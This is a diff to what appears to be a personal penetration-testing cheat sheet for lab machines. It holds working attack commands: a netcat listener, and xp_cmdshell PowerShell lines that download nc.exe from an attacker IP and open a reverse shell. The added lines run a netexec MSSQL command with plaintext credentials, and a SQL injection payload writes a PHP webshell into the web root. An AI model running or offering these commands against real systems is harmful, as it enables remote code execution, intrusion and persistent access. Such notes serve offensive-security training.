@@ -604,6 +604,7 @@ rlwrap nc -nlvp 8888  #Kali
  #Got shell
 
 
+#SSH with 
 ssh adminuser@10.10.155.5 -i id_rsa -D 9050 #TOR port
 
 #Change the info in /etc/proxychains4.conf also enable "Quiet Mode"
@@ -1370,8 +1371,11 @@ xp_cmdshell powershell -c whoami;
 #Download the file
 xp_cmdshell powershell -c iwr -uri http://10.10.153.147:7777/nc.exe -Outfile C:\Users\Public\nc.exe
 xp_cmdshell powershell -c C:\Users\Public\nc.exe 10.10.153.147 8888 -e cmd
+#END
 
-
+#MSSQL
+netexec mssql 10.10.125.148 -u sql_svc -p Dolphin1 -q 'EXEC xp_cmdshell "whoami" '
+#END
 
 #Sometimes we may not have direct access to convert it to RCE from web, then follow below steps
 ' UNION SELECT "<?php system($_GET['cmd']);?>", null, null, null, null INTO OUTFILE "/var/www/html/tmp/webshell.php" -- // #Writing into a new file
